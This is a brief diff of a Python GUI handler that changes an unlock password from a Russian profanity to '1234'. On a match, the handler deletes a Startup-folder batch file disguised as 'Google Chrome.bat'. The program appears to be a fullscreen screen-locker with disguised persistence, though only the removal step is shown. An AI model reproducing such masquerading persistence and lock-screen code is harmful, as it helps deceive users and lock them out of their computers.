@@ -54,7 +54,7 @@ def fullscreen():
 
 def clicked():
     res = format(txt.get())
-    if res == 'говно':
+    if res == '1234':
         file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.bat' % USER_NAME
         os.remove(file_path)
         sys.exit()
